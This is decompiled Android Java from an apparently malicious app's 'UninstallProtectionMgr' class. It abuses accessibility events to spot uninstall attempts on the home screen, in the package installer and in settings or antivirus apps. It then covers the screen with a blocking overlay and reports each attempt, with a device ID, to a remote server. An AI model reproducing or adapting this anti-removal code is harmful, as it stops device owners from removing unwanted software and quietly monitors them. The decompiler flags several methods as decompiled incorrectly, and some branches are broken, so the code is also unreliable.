            C0285a5 lastCachedSource = dqtvuisjd.f52358m1.getLastCachedSource();
            if (lastCachedSource == null || System.currentTimeMillis() - lastCachedSource.f52348a4 >= 500) {
                str = "";
                str2 = str;
            } else {
                str2 = lastCachedSource.f52344a0;
                str = lastCachedSource.f52345a1;
            }
            List listM211940c6 = m211940c6();
            ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(listM211940c6));
            Iterator it = listM211940c6.iterator();
            while (it.hasNext()) {
                arrayList.add(AbstractC0779a1.m213687e0(AbstractC0779a1.m213673c6((String) it.next(), "⠀", "")).toString());
            }
            ArrayList arrayList2 = new ArrayList();
            int size = arrayList.size();
            int i2 = 0;
            while (i2 < size) {
                Object obj = arrayList.get(i2);
                i2++;
                if (((String) obj).length() >= 2) {
                    arrayList2.add(obj);
                }
            }
            String str3 = str2 + " " + str;
            if (arrayList2.isEmpty()) {
                z = false;
                z2 = !AbstractC0779a1.m213663b6(str2) && AbstractC0779a1.m213663b6(str);
                if (!z || z2) {
                    this.f53671a6 = true;
                    this.f53674a9 = z;
                    this.f53672a7 = System.currentTimeMillis();
                    t60.m214702c3("UninstallProtectionMgr", "🛡️ 桌面长按开始监控 isOurApp=" + z + " isUnknown=" + z2 + " confirmed=" + this.f53674a9 + " text='" + str2 + "'");
                } else {
                    this.f53671a6 = false;
                    this.f53674a9 = false;
                    t60.m214702c3("UninstallProtectionMgr", AbstractC0003a2.m34b5("🛡️ 桌面长按，明确非我们的图标（text='", str2, "' desc='", str, "'），跳过监控"));
                }
            } else {
                int size2 = arrayList2.size();
                int i3 = 0;
                while (i3 < size2) {
                    Object obj2 = arrayList2.get(i3);
                    i3++;
                    if (AbstractC0779a1.m213652a5(str3, (String) obj2, true)) {
                        z = true;
                        break;
                    }
                }
                z = false;
                if (AbstractC0779a1.m213663b6(str2)) {
                    if (z) {
                        this.f53671a6 = true;
                        this.f53674a9 = z;
                        this.f53672a7 = System.currentTimeMillis();
                        t60.m214702c3("UninstallProtectionMgr", "🛡️ 桌面长按开始监控 isOurApp=" + z + " isUnknown=" + z2 + " confirmed=" + this.f53674a9 + " text='" + str2 + "'");
                    }
                }
            }
        }
        if (i == 32 || i == 2048) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (this.f53671a6 && jCurrentTimeMillis - this.f53672a7 > 30000) {
                this.f53671a6 = false;
                this.f53674a9 = false;
            }
            if (this.f53686c1) {
                return;
            }
            this.f53677b2.removeCallbacks(this.f53703d8);
            this.f53677b2.post(this.f53703d8);
        }
    }

    /* renamed from: c9 */
    public final void m211943c9(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        String string;
        try {
            w00 w00Var = this.f53694c9;
            boolean z = true;
            if ((w00Var != null && ((Boolean) w00Var.invoke()).booleanValue()) || (packageName = accessibilityEvent.getPackageName()) == null || (string = packageName.toString()) == null) {
                return;
            }
            String lowerCase = string.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            int eventType = accessibilityEvent.getEventType();
            if (!lowerCase.equals("com.android.systemui") && !AbstractC0779a1.m213652a5(lowerCase, "systemui", true) && !AbstractC0779a1.m213652a5(lowerCase, "wallpaper", true) && !AbstractC0779a1.m213652a5(lowerCase, "miui.aod", true) && !AbstractC0779a1.m213652a5(lowerCase, "aodservice", true) && !AbstractC0779a1.m213652a5(lowerCase, "lockscreen", true)) {
                boolean z2 = AbstractC0779a1.m213652a5(lowerCase, "launcher", false) || AbstractC0779a1.m213652a5(lowerCase, "home", false) || m211932d5(lowerCase);
                String[] strArr = f53649g5;
                int length = strArr.length;
                int i = 0;
                while (true) {
                    if (i >= length) {
                        z = false;
                        break;
                    } else if (AbstractC0779a1.m213656a9(strArr[i], lowerCase)) {
                        break;
                    } else {
                        i++;
                    }
                }
                if (!z2 && !z && this.f53671a6) {
                    this.f53671a6 = false;
                }
                if (z2) {
                    m211942c8(eventType);
                    return;
                }
                if (z && this.f53671a6 && (eventType == 32 || eventType == 2048)) {
                    t60.m214702c3("UninstallProtectionMgr", "🛡️ [桌面→安装器] 监控中检测到安装器窗口 pkg=" + lowerCase + "，搜索APP名...");
                    this.f53677b2.post(new nk1(this, 3));
                    return;
                }
                if (this.f53667a2) {
                    if (eventType == 32 || eventType == 2048) {
                        m211937c1(lowerCase);
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:108:0x01f8, code lost:
    
        r0 = r0.iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:110:0x0200, code lost:
    
        if (r0.hasNext() == false) goto L316;
     */
    /* JADX WARN: Code restructure failed: missing block: B:112:0x0208, code lost:
    
        ((android.view.accessibility.AccessibilityNodeInfo) r0.next()).recycle();
     */
    /* JADX WARN: Code restructure failed: missing block: B:117:0x0213, code lost:
    
        if (r23.f53674a9 != false) goto L120;
     */
    /* JADX WARN: Code restructure failed: missing block: B:119:0x0219, code lost:
    
        if (m211928d1(r7, r13) == false) goto L122;
     */
    /* JADX WARN: Code restructure failed: missing block: B:120:0x021b, code lost:
    
        r22 = r13;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:139:0x0283 A[Catch: Exception -> 0x028d, TRY_ENTER, TRY_LEAVE, TryCatch #3 {Exception -> 0x028d, blocks: (B:139:0x0283, B:135:0x0265), top: B:278:0x0132 }] */
    /* JADX WARN: Removed duplicated region for block: B:146:0x0295  */
    /* JADX WARN: Removed duplicated region for block: B:148:0x029d  */
    /* JADX WARN: Removed duplicated region for block: B:152:0x02a9  */
    /* JADX WARN: Removed duplicated region for block: B:162:0x02d0  */
    /* JADX WARN: Removed duplicated region for block: B:171:0x02f2  */
    /* JADX WARN: Removed duplicated region for block: B:173:0x0300  */
    /* JADX WARN: Removed duplicated region for block: B:176:0x0316  */
    /* JADX WARN: Removed duplicated region for block: B:17:0x0035 A[PHI: r2
      0x0035: PHI (r2v1 boolean) = (r2v0 boolean), (r2v0 boolean), (r2v0 boolean), (r2v31 boolean), (r2v0 boolean) binds: [B:11:0x0026, B:19:0x0044, B:21:0x004c, B:52:0x0132, B:15:0x0032] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:184:0x0354  */
    /* JADX WARN: Removed duplicated region for block: B:186:0x035a  */
    /* JADX WARN: Removed duplicated region for block: B:189:0x0361  */
    /* JADX WARN: Removed duplicated region for block: B:194:0x036e  */
    /* JADX WARN: Removed duplicated region for block: B:201:0x0381  */
    /* JADX WARN: Removed duplicated region for block: B:206:0x0399 A[Catch: Exception -> 0x0493, TryCatch #9 {Exception -> 0x0493, blocks: (B:127:0x0256, B:204:0x038f, B:206:0x0399, B:269:0x0487, B:272:0x0490, B:221:0x03b6, B:223:0x03bd, B:225:0x03c3, B:227:0x03cb, B:230:0x03d2, B:232:0x03f4, B:234:0x03fc, B:236:0x0404, B:238:0x040c, B:240:0x0414, B:242:0x041c, B:244:0x0424, B:246:0x042c, B:248:0x0434, B:250:0x043c, B:252:0x0444, B:254:0x044c, B:256:0x0454, B:258:0x045c, B:260:0x0464, B:262:0x046c, B:264:0x0474, B:266:0x047c, B:268:0x0484), top: B:293:0x0026 }] */
    /* JADX WARN: Removed duplicated region for block: B:212:0x03a5  */
    /* JADX WARN: Removed duplicated region for block: B:214:0x03a9  */
    /* JADX WARN: Removed duplicated region for block: B:216:0x03ad  */
    /* JADX WARN: Removed duplicated region for block: B:217:0x03af  */
    /* JADX WARN: Removed duplicated region for block: B:219:0x03b2 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:220:0x03b4  */
    /* JADX WARN: Removed duplicated region for block: B:268:0x0484 A[Catch: Exception -> 0x0493, TryCatch #9 {Exception -> 0x0493, blocks: (B:127:0x0256, B:204:0x038f, B:206:0x0399, B:269:0x0487, B:272:0x0490, B:221:0x03b6, B:223:0x03bd, B:225:0x03c3, B:227:0x03cb, B:230:0x03d2, B:232:0x03f4, B:234:0x03fc, B:236:0x0404, B:238:0x040c, B:240:0x0414, B:242:0x041c, B:244:0x0424, B:246:0x042c, B:248:0x0434, B:250:0x043c, B:252:0x0444, B:254:0x044c, B:256:0x0454, B:258:0x045c, B:260:0x0464, B:262:0x046c, B:264:0x0474, B:266:0x047c, B:268:0x0484), top: B:293:0x0026 }] */
    /* JADX WARN: Removed duplicated region for block: B:271:0x048f  */
    /* JADX WARN: Removed duplicated region for block: B:272:0x0490 A[Catch: Exception -> 0x0493, TRY_LEAVE, TryCatch #9 {Exception -> 0x0493, blocks: (B:127:0x0256, B:204:0x038f, B:206:0x0399, B:269:0x0487, B:272:0x0490, B:221:0x03b6, B:223:0x03bd, B:225:0x03c3, B:227:0x03cb, B:230:0x03d2, B:232:0x03f4, B:234:0x03fc, B:236:0x0404, B:238:0x040c, B:240:0x0414, B:242:0x041c, B:244:0x0424, B:246:0x042c, B:248:0x0434, B:250:0x043c, B:252:0x0444, B:254:0x044c, B:256:0x0454, B:258:0x045c, B:260:0x0464, B:262:0x046c, B:264:0x0474, B:266:0x047c, B:268:0x0484), top: B:293:0x0026 }] */
    /* JADX WARN: Removed duplicated region for block: B:305:0x034e A[EDGE_INSN: B:305:0x034e->B:182:0x034e BREAK  A[LOOP:4: B:175:0x0314->B:181:0x034b], SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:86:0x0190  */
    /* JADX WARN: Type inference failed for: r12v0 */
    /* JADX WARN: Type inference failed for: r12v26, types: [java.lang.Object, java.lang.String] */
    /* JADX WARN: Type inference failed for: r12v29 */
    /* JADX WARN: Type inference failed for: r12v3 */
    /* renamed from: d8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211944d8(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        String string;
        int length;
        int i;
        CharSequence className;
        String lowerCase;
        long jCurrentTimeMillis;
        String string2;
        CharSequence packageName2;
        String string3;
        w00 w00Var;
        CharSequence packageName3;
        boolean z;
        String string4;
        AccessibilityNodeInfo accessibilityNodeInfo;
        boolean z2;
        String lowerCase2;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        String string5;
        Object obj;
        if (this.f53667a2) {
            if (this.f53673a8 && this.f53709e4 == null) {
                this.f53673a8 = false;
            }
            boolean z3 = 2048;
            z3 = 2048;
            String str = "";
            boolean z4 = true;
            try {
                if (this.f53673a8 || !(accessibilityEvent.getEventType() == 32 || accessibilityEvent.getEventType() == 2048)) {
                    z3 = z4;
                } else {
                    long jCurrentTimeMillis2 = System.currentTimeMillis();
                    if (jCurrentTimeMillis2 - this.f53670a5 >= 0 && !this.f53675b0.get()) {
                        List<CharSequence> text = accessibilityEvent.getText();
                        t60.m214694b5(text, "event.text");
                        AccessibilityNodeInfo accessibilityNodeInfo2 = null;
                        if (!text.isEmpty()) {
                            String strM213295i2 = AbstractC0715je.m213295i2(text, " ", null, null, null, 62);
                            String[] strArr = {"卸载", "Uninstall", "移除", "Remove", "删除", "Delete"};
                            int i2 = 0;
                            while (true) {
                                if (i2 >= 6) {
                                    break;
                                }
                                if (AbstractC0779a1.m213652a5(strM213295i2, strArr[i2], true)) {
                                    List listM211940c6 = m211940c6();
                                    ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(listM211940c6));
                                    Iterator it = listM211940c6.iterator();
                                    while (it.hasNext()) {
                                        arrayList.add(AbstractC0779a1.m213687e0(AbstractC0779a1.m213673c6((String) it.next(), "⠀", "")).toString());
                                    }
                                    ArrayList arrayList2 = new ArrayList();
                                    int size = arrayList.size();
                                    int i3 = 0;
                                    while (i3 < size) {
                                        Object obj2 = arrayList.get(i3);
                                        i3++;
                                        int i4 = size;
                                        ArrayList arrayList3 = arrayList;
                                        if (((String) obj2).length() >= 2) {
                                            arrayList2.add(obj2);
                                        }
                                        arrayList = arrayList3;
                                        size = i4;
                                    }
                                    int size2 = arrayList2.size();
                                    int i5 = 0;
                                    while (true) {
                                        if (i5 >= size2) {
                                            z4 = true;
                                            obj = null;
                                            break;
                                        }
                                        obj = arrayList2.get(i5);
                                        i5++;
                                        ArrayList arrayList4 = arrayList2;
                                        z4 = true;
                                        if (AbstractC0779a1.m213652a5(strM213295i2, (String) obj, true)) {
                                            break;
                                        } else {
                                            arrayList2 = arrayList4;
                                        }
                                    }
                                    z3 = (String) obj;
                                    if (z3 != 0) {
                                        this.f53670a5 = jCurrentTimeMillis2;
                                        t60.m214726f4("UninstallProtectionMgr", AbstractC0003a2.m34b5("🛡️⚡⚡ [零延迟A] event.text命中: '", z3, "' in '", strM213295i2, "' → 立即遮挡"));
                                        m211949e3();
                                        m211945d9("DESKTOP_UNINSTALL", "零延迟-事件文字", AbstractC1117qo.m214451e7(z3), "全屏遮挡", null);
                                        this.f53671a6 = false;
                                        return;
                                    }
                                } else {
                                    i2++;
                                }
                            }
                        }
                        try {
                            try {
                                if (this.f53671a6) {
                                    try {
                                        w00 w00Var2 = this.f53695d0;
                                        accessibilityNodeInfo = w00Var2 != null ? (AccessibilityNodeInfo) w00Var2.invoke() : null;
                                    } catch (Exception e) {
                                        e = e;
                                        z3 = z4;
                                    }
                                    if (accessibilityNodeInfo != null) {
                                        try {
                                            try {
                                                CharSequence packageName4 = accessibilityNodeInfo.getPackageName();
                                                if (packageName4 == null || (string5 = packageName4.toString()) == null) {
                                                    lowerCase2 = "";
                                                } else {
                                                    lowerCase2 = string5.toLowerCase(Locale.ROOT);
                                                    t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                                }
                                            } catch (Throwable th) {
                                                th = th;
                                                accessibilityNodeInfo2 = accessibilityNodeInfo;
                                                if (accessibilityNodeInfo2 != null) {
                                                    try {
                                                        accessibilityNodeInfo2.recycle();
                                                    } catch (Exception unused) {
                                                    }
                                                }
                                                throw th;
                                            }
                                        } catch (Exception e2) {
                                            e = e2;
                                            z2 = z4;
                                        }
                                        if (AbstractC0779a1.m213652a5(lowerCase2, "launcher", false) || AbstractC0779a1.m213652a5(lowerCase2, "home", false) || AbstractC0779a1.m213652a5(lowerCase2, "hiboard", false) || lowerCase2.equals("com.miui.home") || m211932d5(lowerCase2)) {
                                            if (m211931d4(accessibilityNodeInfo) || !m211935b8(accessibilityNodeInfo)) {
                                                z3 = z4;
                                            } else {
                                                List listM211940c62 = m211940c6();
                                                ArrayList arrayList5 = new ArrayList();
                                                for (Object obj3 : listM211940c62) {
                                                    if (!AbstractC0779a1.m213663b6((String) obj3)) {
                                                        arrayList5.add(obj3);
                                                    }
                                                }
                                                String strM211941c7 = m211941c7(accessibilityNodeInfo, arrayList5);
                                                if (strM211941c7 == null) {
                                                    try {
                                                        int size3 = arrayList5.size();
                                                        int i6 = 0;
                                                        while (true) {
                                                            if (i6 >= size3) {
                                                                break;
                                                            }
                                                            Object obj4 = arrayList5.get(i6);
                                                            i6++;
                                                            String str2 = (String) obj4;
                                                            String string6 = AbstractC0779a1.m213687e0(str2).toString();
                                                            int i7 = size3;
                                                            ArrayList arrayList6 = arrayList5;
                                                            if (string6.length() >= 2 && (listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(string6)) != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                                                break;
                                                            }
                                                            size3 = i7;
                                                            arrayList5 = arrayList6;
                                                        }
                                                        strM211941c7 = accessibilityNodeInfo2;
                                                    } catch (Exception e3) {
                                                        e = e3;
                                                        accessibilityNodeInfo2 = accessibilityNodeInfo;
                                                        z3 = 1;
                                                        t60.m214702c3("UninstallProtectionMgr", "🛡️ [零延迟B] 主线程快速检测异常: " + e.getMessage());
                                                        if (accessibilityNodeInfo2 != null) {
                                                            accessibilityNodeInfo2.recycle();
                                                            z3 = z3;
                                                        }
                                                        if (accessibilityEvent.getEventType() == 32) {
                                                            packageName = accessibilityEvent.getPackageName();
                                                            if (packageName != null) {
                                                                string = "";
                                                                if (string.equals("com.android.systemui")) {
                                                                    className = accessibilityEvent.getClassName();
                                                                    if (className != null) {
                                                                        lowerCase = "";
                                                                        if (!AbstractC0779a1.m213652a5(lowerCase, "dialog", false)) {
                                                                            jCurrentTimeMillis = System.currentTimeMillis();
                                                                            if (jCurrentTimeMillis - this.f53684b9 >= this.f53683b8) {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                                String[] strArr2 = f53649g5;
                                                                length = strArr2.length;
                                                                i = 0;
                                                                while (true) {
                                                                    if (i >= length) {
                                                                    }
                                                                    i++;
                                                                }
                                                            }
                                                        }
                                                        packageName2 = accessibilityEvent.getPackageName();
                                                        if (packageName2 == null) {
                                                            string3 = "";
                                                        }
                                                        if (string3.length() > 0) {
                                                            m211950e4(string3);
                                                        }
                                                        if (this.f53667a2) {
                                                            m211950e4(string3);
                                                        }
                                                        w00Var = this.f53694c9;
                                                        if (w00Var == null) {
                                                        }
                                                        int eventType = accessibilityEvent.getEventType();
                                                        packageName3 = accessibilityEvent.getPackageName();
                                                        if (packageName3 != null) {
                                                            str = string4;
                                                        }
                                                        if (eventType == 32) {
                                                        }
                                                        if (eventType == 2048) {
                                                        }
                                                        if (z) {
                                                            if (z) {
                                                                t60.m214702c3("UninstallProtectionMgr", "🔍 [事件] pkg=" + str + ", class=" + ((Object) accessibilityEvent.getClassName()));
                                                            }
                                                            if (z) {
                                                                AbstractC0779a1.m213652a5(str, "honor", z3);
                                                            }
                                                            if (z) {
                                                            }
                                                        }
                                                        if (this.f53675b0.get()) {
                                                        }
                                                    }
                                                }
                                                if (strM211941c7 != null) {
                                                    try {
                                                        this.f53670a5 = jCurrentTimeMillis2;
                                                        t60.m214726f4("UninstallProtectionMgr", "🛡️⚡⚡ [零延迟B] 主线程ViewId检测命中: '" + strM211941c7 + "' → 立即遮挡");
                                                        m211949e3();
                                                        z2 = true;
                                                    } catch (Exception e4) {
                                                        e = e4;
                                                        z2 = true;
                                                    }
                                                    try {
                                                        m211945d9("DESKTOP_UNINSTALL", "零延迟-主线程ViewId", AbstractC1117qo.m214451e7(strM211941c7), "全屏遮挡", null);
                                                        this.f53671a6 = false;
                                                        accessibilityNodeInfo.recycle();
                                                        return;
                                                    } catch (Exception e5) {
                                                        e = e5;
                                                        accessibilityNodeInfo2 = accessibilityNodeInfo;
                                                        z3 = z2;
                                                        t60.m214702c3("UninstallProtectionMgr", "🛡️ [零延迟B] 主线程快速检测异常: " + e.getMessage());
                                                        if (accessibilityNodeInfo2 != null) {
                                                        }
                                                        if (accessibilityEvent.getEventType() == 32) {
                                                        }
                                                        packageName2 = accessibilityEvent.getPackageName();
                                                        if (packageName2 == null) {
                                                        }
                                                        if (string3.length() > 0) {
                                                        }
                                                        if (this.f53667a2) {
                                                        }
                                                        w00Var = this.f53694c9;
                                                        if (w00Var == null) {
                                                        }
                                                        int eventType2 = accessibilityEvent.getEventType();
                                                        packageName3 = accessibilityEvent.getPackageName();
                                                        if (packageName3 != null) {
                                                        }
                                                        if (eventType2 == 32) {
                                                        }
                                                        if (eventType2 == 2048) {
                                                        }
                                                        if (z) {
                                                        }
                                                        if (this.f53675b0.get()) {
                                                        }
                                                    }
                                                } else {
                                                    z3 = 1;
                                                }
                                            }
                                            if (accessibilityNodeInfo != null) {
                                                accessibilityNodeInfo.recycle();
                                                z3 = z3;
                                            }
                                        }
                                    }
                                }
                            } catch (Throwable th2) {
                                th = th2;
                            }
                        } catch (Exception unused2) {
                        }
                    }
                }
                if (accessibilityEvent.getEventType() == 32 || accessibilityEvent.getEventType() == 2048) {
                    packageName = accessibilityEvent.getPackageName();
                    if (packageName != null || (string = packageName.toString()) == null) {
                        string = "";
                    }
                    if (string.equals("com.android.systemui") && accessibilityEvent.getEventType() == 32) {
                        className = accessibilityEvent.getClassName();
                        if (className != null || (string2 = className.toString()) == null) {
                            lowerCase = "";
                        } else {
                            lowerCase = string2.toLowerCase(Locale.ROOT);
                            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        }
                        if (!AbstractC0779a1.m213652a5(lowerCase, "dialog", false) || AbstractC0779a1.m213652a5(lowerCase, "panel", false) || AbstractC0779a1.m213652a5(lowerCase, "activity", false) || AbstractC0779a1.m213652a5(lowerCase, "fragment", false)) {
                            jCurrentTimeMillis = System.currentTimeMillis();
                            if (jCurrentTimeMillis - this.f53684b9 >= this.f53683b8) {
                                this.f53684b9 = jCurrentTimeMillis;
                                this.f53677b2.removeCallbacks(this.f53685c0);
                                this.f53677b2.post(this.f53685c0);
                            }
                        }
                    }
                    String[] strArr22 = f53649g5;
                    length = strArr22.length;
                    i = 0;
                    while (true) {
                        if (i >= length) {
                            break;
                        }
                        if (!AbstractC0779a1.m213656a9(strArr22[i], string)) {
                            i++;
                        } else if (!this.f53673a8) {
                            t60.m214702c3("UninstallProtectionMgr", "🛡️ [安装器事件] pkg=" + string + " type=" + accessibilityEvent.getEventType());
                            this.f53677b2.post(new nk1(this, 1));
                        }
                    }
                }
                packageName2 = accessibilityEvent.getPackageName();
                if (packageName2 == null || (string3 = packageName2.toString()) == null) {
                    string3 = "";
                }
                if (string3.length() > 0 && m211934d7(string3)) {
                    m211950e4(string3);
                }
                if (this.f53667a2 && string3.length() > 0 && m211929d2(string3)) {
                    m211950e4(string3);
                }
                w00Var = this.f53694c9;
                if (w00Var == null && ((Boolean) w00Var.invoke()).booleanValue() == z3) {
                    return;
                }
                int eventType22 = accessibilityEvent.getEventType();
                packageName3 = accessibilityEvent.getPackageName();
                if (packageName3 != null && (string4 = packageName3.toString()) != null) {
                    str = string4;
                }
                z = eventType22 == 32 ? z3 : false;
                boolean z5 = eventType22 == 2048 ? z3 : false;
                if (z || z5) {
                    if (z && !AbstractC0779a1.m213652a5(str, "launcher", false) && !AbstractC0779a1.m213652a5(str, "hiboard", false) && !AbstractC0779a1.m213652a5(str, "puresearch", false) && !AbstractC0779a1.m213652a5(str, "home", z3)) {
                        t60.m214702c3("UninstallProtectionMgr", "🔍 [事件] pkg=" + str + ", class=" + ((Object) accessibilityEvent.getClassName()));
                    }
                    if (z && !AbstractC0779a1.m213652a5(str, "settings", z3) && !AbstractC0779a1.m213652a5(str, "systemmanager", z3) && !AbstractC0779a1.m213652a5(str, "securitycenter", z3) && !AbstractC0779a1.m213652a5(str, "packageinstaller", z3) && !AbstractC0779a1.m213652a5(str, "antivirus", z3) && !AbstractC0779a1.m213652a5(str, "miui", z3) && !AbstractC0779a1.m213652a5(str, "secure", z3) && !AbstractC0779a1.m213652a5(str, "safecenter", z3) && !AbstractC0779a1.m213652a5(str, "phonemanager", z3) && !AbstractC0779a1.m213652a5(str, "appmanager", z3) && !AbstractC0779a1.m213652a5(str, "devicemanager", z3) && !AbstractC0779a1.m213652a5(str, "iqoo", z3) && !AbstractC0779a1.m213652a5(str, "bbk", z3) && !AbstractC0779a1.m213652a5(str, "vivo", z3) && !AbstractC0779a1.m213652a5(str, "oppo", z3) && !AbstractC0779a1.m213652a5(str, "coloros", z3) && !AbstractC0779a1.m213652a5(str, "huawei", z3)) {
                        AbstractC0779a1.m213652a5(str, "honor", z3);
                    }
                    if (z) {
                        m211936c0(accessibilityEvent);
                    }
                }
                if (this.f53675b0.get()) {
                    return;
                }
                m211943c9(accessibilityEvent);
            } catch (Exception unused3) {
            }
        }
    }

    /* renamed from: d9 */
    public final void m211945d9(String str, String str2, List list, String str3, String str4) {
        this.f53671a6 = false;
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (str.equals(this.f53711e6) && jCurrentTimeMillis - this.f53712e7 < this.f53713e8) {
            t60.m214702c3("UninstallProtectionMgr", "🛡️ [上报] 去重跳过: " + str + " (" + (jCurrentTimeMillis - this.f53712e7) + "ms内已上报)");
            return;
        }
        this.f53711e6 = str;
        this.f53712e7 = jCurrentTimeMillis;
        try {
            String str5 = AbstractC0315a0.f53025a0;
            AbstractC0315a0.m211545a7("检测到卸载尝试 类型=" + str + " " + str2);
        } catch (Exception unused) {
        }
        try {
            C0323a8 c0323a8 = this.f53691c6;
            if (c0323a8 == null) {
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("type", str);
            jSONObject.put("message", str2);
            jSONObject.put("timestamp", jCurrentTimeMillis);
            if (list != null && !list.isEmpty()) {
                jSONObject.put("keywords", new JSONArray((Collection<?>) list));
            }
            if (str3.length() != 0) {
                jSONObject.put("action", str3);
            }
            if (str4 != null && str4.length() != 0) {
                jSONObject.put("trigger_package", str4);
            }
            c0323a8.m211658c4(StringUtil.m212470a0("PlcYNF4sDSJbDipNBT9AKBgRUzQ/XBIuSDw="), jSONObject);
        } catch (Exception unused2) {
        }
    }

    /* renamed from: e0 */
    public final void m211946e0() {
        am0 am0Var = this.f53709e4;
        if (am0Var == null) {
            return;
        }
        this.f53709e4 = null;
        this.f53676b1.removeCallbacks(this.f53710e5);
        this.f53673a8 = false;
        try {
            WindowManager windowManager = (WindowManager) this.f53681b6.getValue();
            if (windowManager != null) {
                windowManager.removeView(am0Var);
            }
            t60.m214702c3("UninstallProtectionMgr", "🛡️ [系统卸载拦截] 全屏拦截层已移除，恢复正常监控");
        } catch (Exception unused) {
        }
        this.f53677b2.post(new nk1(this, 0));
    }

    /* renamed from: e1 */
    public final void m211947e1() {
        this.f53676b1.post(new nk1(this, 4));
        this.f53675b0.set(false);
        this.f53671a6 = false;
        this.f53672a7 = 0L;
        this.f53674a9 = false;
        m211951e5();
        this.f53670a5 = 0L;
        this.f53677b2.removeCallbacksAndMessages(null);
        t60.m214702c3("UninstallProtectionMgr", "🛡️ [状态重置] 所有运行时状态已清除");
    }

    /* renamed from: e2 */
    public final void m211948e2(String str, boolean z) {
        String str2;
        try {
            C0323a8 c0323a8 = this.f53691c6;
            if (c0323a8 == null) {
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
            jSONObject.put("enabled", z);
            jSONObject.put("message", str);
            jSONObject.put("timestamp", System.currentTimeMillis());
            w00 w00Var = this.f53696d1;
            if (w00Var == null || (str2 = (String) w00Var.invoke()) == null) {
                str2 = "unknown";
            }
            jSONObject.put("deviceId", str2);
            c0323a8.m211658c4(StringUtil.m212470a0("PlcYNF4sDSJbDjtLHi5IOxgnWD8USgU7WS0f"), jSONObject);
        } catch (Exception unused) {
        }
    }

    /* renamed from: e3 */
    public final void m211949e3() {
        if (this.f53709e4 != null) {
            t60.m214702c3("UninstallProtectionMgr", "🛡️ [系统卸载拦截] 遮挡层已存在，跳过");
            return;
        }
        this.f53673a8 = true;
        this.f53677b2.removeCallbacksAndMessages(null);
        WindowManager windowManager = (WindowManager) this.f53681b6.getValue();
        if (windowManager == null) {
            this.f53673a8 = false;
            return;
        }
        WindowManager.LayoutParams layoutParams = (WindowManager.LayoutParams) this.f53682b7.getValue();
        if (layoutParams == null) {
            this.f53673a8 = false;
            return;
        }
        am0 am0Var = new am0(new Ref$BooleanRef(), this, this.f53665a0);
        try {
            windowManager.addView(am0Var, layoutParams);
            this.f53709e4 = am0Var;
            t60.m214714d6("UninstallProtectionMgr", "🛡️ [系统卸载拦截] 全屏拦截层已添加");
            this.f53676b1.removeCallbacks(this.f53710e5);
            this.f53676b1.postDelayed(this.f53710e5, 60000L);
        } catch (Exception e) {
            t60.m214705c6("UninstallProtectionMgr", "🛡️ [系统卸载拦截] WindowManager.addView 失败", e);
            this.f53709e4 = null;
            this.f53673a8 = false;
        }
    }

    /* renamed from: e4 */
    public final void m211950e4(String str) {
        if (this.f53686c1) {
            String str2 = this.f53687c2;
            if (str2 == null || str2.equalsIgnoreCase(str)) {
                return;
            }
            this.f53690c5 = System.currentTimeMillis();
            this.f53687c2 = str;
            t60.m214702c3("UninstallProtectionMgr", AbstractC0003a2.m34b5("🛡️ [轮询] 包名变化: ", str, " → ", str, "，重置计时器"));
            return;
        }
        m211951e5();
        this.f53677b2.removeCallbacksAndMessages(null);
        this.f53686c1 = true;
        this.f53687c2 = str;
        this.f53690c5 = System.currentTimeMillis();
        this.f53700d5 = 0;
        this.f53701d6 = 0;
        t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询] 启动危险包名轮询: " + str + " (已清空队列)");
        this.f53677b2.post(this.f53702d7);
    }

    /* renamed from: e5 */
    public final void m211951e5() {
        if (this.f53686c1) {
            long jCurrentTimeMillis = System.currentTimeMillis() - this.f53690c5;
            t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询] 停止轮询: " + this.f53687c2 + " (已运行" + jCurrentTimeMillis + "ms, 共" + this.f53700d5 + "轮)");
        }
        this.f53686c1 = false;
        this.f53687c2 = null;
        this.f53677b2.removeCallbacks(this.f53702d7);
    }
}
